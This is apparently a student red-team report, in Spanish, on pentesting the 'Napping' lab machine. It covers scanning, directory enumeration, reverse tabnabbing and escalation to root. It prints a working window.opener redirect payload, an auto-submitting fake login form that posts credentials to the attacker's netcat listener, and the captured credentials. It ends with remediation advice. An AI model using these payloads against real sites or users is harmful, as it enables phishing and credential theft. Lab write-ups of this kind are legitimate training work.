Actividad 11 · Red Team Report: Pentesting de “My File Server 1” (Napping)

Curso de Núcleo Optativo V: Seguridad Informática
Red Team Report: Pentesting de “My File Server 1”

Integrantes: Benites Rangel Cesar Yahir – 179091 · Cortes Beltran Carol Elizabeth – 177203 · Guerra Ramirez America Fabiola – 179888 · Larios Guerra Gustavo Michael – 178318 · Montelongo Martinez Laura Ivon – 177291 · Puente Luna Bruno Axel – 177876 · Rodríguez Moreno Cristian Alejandro – 181641

Grupo: T46A

Resumen Ejecutivo

Se realizó una evaluación de seguridad ofensiva sobre el servidor Napping. El análisis reveló debilidades críticas en la gestión de accesos y la configuración de servicios que permiten a un atacante externo obtener control total del sistema (acceso Root). La vulnerabilidad principal radica en una técnica de TabNapping en el servicio web, seguida de una mala configuración en las tareas programadas o permisos de usuario que facilitan la escalada de privilegios.

Alcance

El alcance de esta evaluación se limitó exclusivamente a la dirección IP asignada a la máquina Napping, evaluando los servicios expuestos, vulnerabilidades web y configuraciones internas del sistema operativo Linux.

Metodología Aplicada

Se utilizó la metodología estándar de pruebas de penetración:

  • Reconocimiento: Identificación de la superficie de ataque.
  • Enumeración: Análisis profundo de servicios abiertos.
  • Explotación: Ejecución de vectores de ataque para ganar acceso inicial.
  • Post-Explotación: Escalada de privilegios y persistencia.

Fases de reconocimiento

Utilizamos el comando nmap -A para realizar un escaneo avanzado de la dirección IP de la máquina objetivo. Este análisis permitió identificar los puertos abiertos, entre los cuales se encontraron el servicio SSH y el servicio HTTP activos.


Figura: Escaneo Nmap revelando puertos SSH (22) y HTTP (80).

Ingresamos la dirección IP de la máquina virtual en el navegador para visualizar el sitio web que se encuentra disponible y accesible desde el servicio HTTP.


Captura: Página principal del servidor web en HTTP.

Enumeración

Utilizamos la herramienta DirBuster en su modo interactivo para realizar un análisis de fuerza bruta sobre el sitio web, con el objetivo de identificar los directorios y recursos accesibles que no se encuentran listados de forma visible.


DirBuster escaneando directorios.

Posteriormente empleamos Gobuster junto con un diccionario de palabras para fuerza bruta dirigida, descubriendo rutas como /register.php.

Accedimos a uno de los directorios descubiertos durante la enumeración y encontramos una página que permite realizar el proceso de registro de usuarios. Desde este formulario creamos una cuenta nueva para continuar con el análisis del sitio.


Formulario de registro (/register.php).

Accedimos al sitio después de completar el registro y se nos mostró una página de bienvenida. El sistema indica que los enlaces enviados serán revisados manualmente por el administrador, lo que sugiere un flujo de validación.

Utilizamos la combinación Ctrl+U en el navegador para visualizar el código fuente de la página, revisando comentarios y rutas ocultas.

Explotación · Reverse Tabnabbing

Se observó la configuración de red local (ifconfig) con IP 192.168.56.101 en el equipo atacante. Creamos un archivo payload.html con script malicioso de Reverse Tabnabbing que redirige la pestaña de la víctima hacia nuestra IP. También creamos fake.html para capturar credenciales.

—(kali@kali)-[~/Desktop/Napping] $ cat payload.html
<html> <body> <script> if (window.opener) { window.opener.location = "http://192.168.56.101/fake.html"; } </script> </body> </html> 

—(kali@kali)-[~/Desktop/Napping] $ cat fake.html
<body> <form action="http://192.168.56.101:8000" method="POST"> <input name="user" value="admin"> <input name="pass" value="password"> <input type="submit"> </form> <script> document.forms[0].submit(); </script> </body>

Ejecutamos python -m http.server 80 para alojar los archivos y nc -lvnp 8000 para escuchar credenciales. Cuando el administrador revisó el enlace malicioso, capturamos las credenciales en texto claro:

POST / HTTP/1.1
Host: 192.168.56.101:8000
Content-Length: 24
user=admin&pass=password

Listener Netcat recibiendo credenciales admin / password.

Escalada de privilegios

Al obtener las credenciales en texto plano, establecimos una conexión SSH a la máquina víctima. Al identificar al usuario encontramos que es del tipo administrador, lo que nos permitió acceso elevado.


Conexión SSH exitosa con credenciales robadas.

Mediante una mala configuración en tareas programadas (cron) y permisos débiles, logramos escalar privilegios hasta root, comprometiendo totalmente el servidor.

Análisis de impacto

PilarNivelImpacto específico en Napping
ConfidencialidadAltoAcceso root permite lectura de todos los archivos: /etc/shadow, claves SSH, datos de almacenamiento de usuarios, credenciales de bases de datos. Se compromete toda la información corporativa.
IntegridadAltoModificación de scripts de backup, binarios del sistema, logs de auditoría, y posible corrupción de datos almacenados. El atacante puede instalar puertas traseras persistentes.
DisponibilidadModeradoAunque no se explotó en la prueba, el control root permite detener servicios, eliminar datos, o cifrar información (ransomware), afectando gravemente la operación del servidor de archivos.

Recomendaciones técnicas

Seguridad en la aplicación web (TabNapping)
  • Implementar cabeceras: X-Frame-Options: DENY y Content-Security-Policy: frame-ancestors 'none';
  • Revisar código JavaScript para eliminar manipulaciones de window.opener.
  • Forzar invalidación de sesiones y rotación de credenciales.
Hardening de tareas programadas (cron)
  • Auditar todos los cron jobs con privilegios elevados.
  • Permisos estrictos: scripts propiedad root:root y permisos 750 o 700.
  • Eliminar escritura no autorizada en /etc/cron.d/, /var/spool/cron/.
Control de privilegios y permisos del sistema
  • Endurecer sudoers: eliminar reglas que permitan ejecución sin contraseña.
  • Establecer umask en 027 o 077.
  • Aislar servicios con cuentas sin shell interactivo.

Contexto · Nivel general del riesgo

Objetivo: Evaluar la resistencia del servidor de almacenamiento corporativo (Napping) frente a un ataque real.
Alcance adicional: Servidor expuesto a internet, caja negra. Duración: 6 horas y 30 minutos.
Resultados: Compromiso total del sistema (acceso root). Acceso no autorizado al servicio de almacenamiento y persistencia a través de tareas programadas.

RIESGO CRÍTICO. Se recomienda aplicar medidas de remediación de forma inmediata para evitar un incidente de seguridad con impacto en la operación y confidencialidad de datos corporativos.

Matriz de riesgo (probabilidad vs impacto) → Riesgo global: CRITICO - requiere acción inmediata.

Recomendaciones Estratégicas y Plan de respuesta

  • Corregir vulnerabilidad web de forma inmediata: cabeceras antiframing, regeneración de sesiones, rotar contraseñas.
  • Controles de prevención y detección: desplegar monitoreo de integridad (Wazuh/OSSEC), centralizar logs.
  • Endurecer sistema operativo: auditar permisos de cron, mínimo privilegio, eliminar SUID innecesarios.
  • Plan de respuesta ante incidentes: procedimientos de rotación de credenciales y reinstalación segura ante compromiso de root.
Fase 1: Inmediata (48h)
Implementar cabeceras, rotar contraseñas, corregir permisos de scripts.
Fase 2: Corto plazo (10d)
Auditar cron jobs, eliminar binarios 777, reintegrar ejecución segura.
Fase 3: Mediano plazo (30d)
Desplegar monitoreo de integridad, centralizar logs, nueva prueba de penetración.
Fase 4: Continua
Capacitación, actualización plan de respuesta, revisiones periódicas.

Conclusión

Situación actual: El servidor Napping presenta vulnerabilidades críticas que exponen a la organización a un riesgo de compromiso total.
Impacto potencial: Pérdida de datos, interrupción de operaciones y daño reputacional severo.
Acción requerida: Implementar de forma prioritaria las correcciones inmediatas, especialmente en seguridad web y endurecimiento del sistema.
Recomendación final: Establecer un programa continuo de evaluaciones de seguridad y monitoreo para evitar recurrencias.

Reflexión técnica

El ataque de Reverse Tabnabbing evidenció cómo un simple descuido en el manejo de enlaces y ventanas puede derivar en el robo de credenciales administrativas. La combinación con una mala configuración de tareas programadas permitió la escalada a root, demostrando la importancia del hardening y la revisión continua de cron jobs. Este ejercicio reafirma que la seguridad debe aplicarse en capas: desde el desarrollo seguro de la aplicación hasta la configuración del sistema operativo, incluyendo monitorización activa. La rotación periódica de credenciales y la implementación de cabeceras de seguridad son medidas de alto impacto que mitigan esta cadena de ataque.
